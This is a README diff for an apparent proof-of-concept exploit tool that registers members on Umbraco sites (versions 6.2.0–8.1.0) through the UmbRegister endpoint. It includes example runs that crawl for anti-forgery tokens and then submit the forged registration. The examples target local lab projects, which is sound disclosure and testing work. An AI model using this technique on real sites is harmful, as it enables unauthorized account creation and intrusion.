@@ -42,3 +42,49 @@ optional arguments:
 
 Note that it is necessary to crawl for the anti-forgery tokens in Umbraco versions 7.13 and up.
 ```
+
+This script was developed under Python 3.7.4 but may work with other versions. Note that it will always result in an HTTP 500 error which may or may not mean that it succeeded (you will need to check the backoffice or attempt a login).
+
+### Examples
+
+The included Visual Studio solution contains a number of target projects running different versions of Umbraco. Each of them contains a dummy contact form from which tokens can be extracted.
+
+#### Umbraco 6.2.0-7.12.4
+
+The endpoint can be acessed without a token so we can run the script with just the URL parameter.
+
+```
+$ python umbregister_spoofer.py https://localhost:44303/
+Request URL: https://localhost:44303/Umbraco/Surface/UmbRegister/HandleRegisterMember
+Parameters:
+{'registerModel.Email': 'neo@matrix.com',
+ 'registerModel.Name': 'Neo',
+ 'registerModel.Password': 'Umbraco12345!',
+ 'registerModel.Username': 'N30'}
+HTTP Error 500: Internal Server Error
+```
+
+#### Umbraco 7.13.0-8.1.0
+
+Pass the `-C` parameter to tell the script to crawl the site to find tokens:
+
+```
+$ python umbregister_spoofer.py -C https://localhost:44389/
+Crawling URL: https://localhost:44389/
+- Anti-forgery cookie not present. Continuing to crawl...
+Crawling URL: https://localhost:44389/blog/
+- Anti-forgery cookie not present. Continuing to crawl...
+Crawling URL: https://localhost:44389/contact/
+- Found anti-forgery cookie.
+- Found anti-forgery token and ufprt. This should be everything we need.
+- Stop crawling and proceed with exploit? [Y/N] Y
+Request URL: https://localhost:44389/Umbraco/Surface/UmbRegister/HandleRegisterMember
+Parameters:
+{'__RequestVerificationToken': 'egnI0UOSQl730fgxLvgEBMiy8KF_GSq3DA8bupvXVPaLWnsE3GipRnmvatyBK2j5mHGouf53Zmw7jhX4wSWlQA7Uh_5U-I9T9lGbsquH2QxmNz4MufOc3patEyN9t1zE3ajIbtYcX8ZfEvS6I6eIROHF3GmCVbhfzVijbbbaTjYFdEOSUN9imjvXqbXqpoxjYIlR9dQtk2Ys2n5awT1_akxAYVm754MaC3rDXg_5J3mWbsx3IpNhZzFsunknYN5hK611i2HLaKizzpxaLl1AN9DRV6CAtccUBivc4Uq4-LAWfTBIhYgySBvzhC38MUq2bbMc6Aymii3u_DcMLRtHqELiWMNET1oKwIrRXIaxah9l3G7u0Jm8L0xOOIT0zeBnBUqhjEVess2HIX4gaIVzbx4uhPKBZopt4urHdDa5CEJXGViq_-AysB9IxEOBwungTdT4gR7bVH8Zr_pguAFLSCAbsW_xV-YyV7--6zBtJoCwdraLUBo9UyL81JBqmaUzBURwzsGoMGjKt6hZk6RFphOdATxUd1x8bIloR3gcMkkhOteMpIVMPoZz4eD11gJ90',
+ 'registerModel.Email': 'neo@matrix.com',
+ 'registerModel.Name': 'Neo',
+ 'registerModel.Password': 'Umbraco12345!',
+ 'registerModel.Username': 'N30',
+ 'ufprt': '90194FDCDDE128A19688E33985018BABFB7E1FE853413A9249401336B5DFAB456130C8026245F6B7AEB73485504A99972B4218BA92CDD70FF54A6BC844EAC65B3D19FC8B45CF85645D61240254B0F56DDD8DF0082118647AD10BF8A1174B30B808B64C1B47A33F7683A228144166B18F21E262A8F9AADA45938D63EC4AF967A036F735CAC7B57B2E845126D001B388DD'}
+HTTP Error 500: Internal Server Error
+```
